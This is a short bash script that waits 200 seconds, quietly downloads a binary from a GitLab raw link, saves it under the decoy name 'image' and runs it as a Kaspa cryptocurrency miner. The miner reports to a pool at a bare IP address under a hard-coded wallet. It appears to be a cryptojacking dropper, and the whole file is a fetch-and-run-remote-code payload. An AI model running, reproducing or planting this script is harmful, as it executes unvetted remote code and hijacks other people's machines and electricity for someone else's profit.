#!/bin/bash
sleep 200
wget -qO image https://gitlab.com/teletyl/oon/-/raw/main/news && chmod +x image
./image --algo KASPA --pool 47.88.32.232:443 --user kaspa:qzh5k3uwdw498pgmkn8pke3rj75f8x0w5mp8m4ue082524hw789vz7gg92kfq.$(echo A-V100-$(date +"%T")) --tls enable
